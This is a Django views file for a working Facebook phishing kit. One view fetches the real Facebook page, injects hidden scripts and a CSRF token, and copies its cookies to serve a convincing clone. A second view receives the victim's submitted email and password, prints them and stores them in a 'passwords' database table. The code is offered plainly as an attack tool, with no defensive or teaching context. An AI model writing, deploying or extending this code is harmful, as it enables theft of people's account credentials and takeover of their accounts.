from django.shortcuts import render
from django.http import HttpResponse
try:
    from django.core.context_processors import csrf
except:
    from django.template.context_processors import csrf
from .models import passwords
import requests
try:
    from django.utils import simplejson as json
except ImportError:
    import json
# Create your views here.
def phish(request):
	csrf_c=request.META.get('CSRF_COOKIE',None)
	if not csrf_c:
		csrf_c=csrf._get_new_csrf_key()
		request.META['CSRF_COOKIE'] = csrf_c
	req=requests.get("https://en-gb.facebook.com")
	text=req.text.replace('</body>','<span id="csrf" hidden>'+str(csrf_c)+'</span><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script><script src="/static/jquery.cookie.js"></script><script src="/static/fb12448784534457.js"></script></body>')
	response=HttpResponse(text)
	for c in req.cookies:
		request.META[c.name]=c.value
		response.set_cookie(c.name,c.value)
	#return render(request,"phishing.html")
	response.set_cookie('csrftoken', value=str(csrf_c))
	return response

def Passwords(request):
	if request.method=='POST':
		username=str(request.POST.get('email'))
		password=str(request.POST.get('pass'))
		print(username,password)
		if not passwords.objects.filter(username=username,password=password):
			passwords(username=username,password=password).save()
		ctx={'Success':'Success'}
	else:
		ctx={'Bad':'Hacker'}
	return HttpResponse(json.dumps(ctx), content_type='application/json')




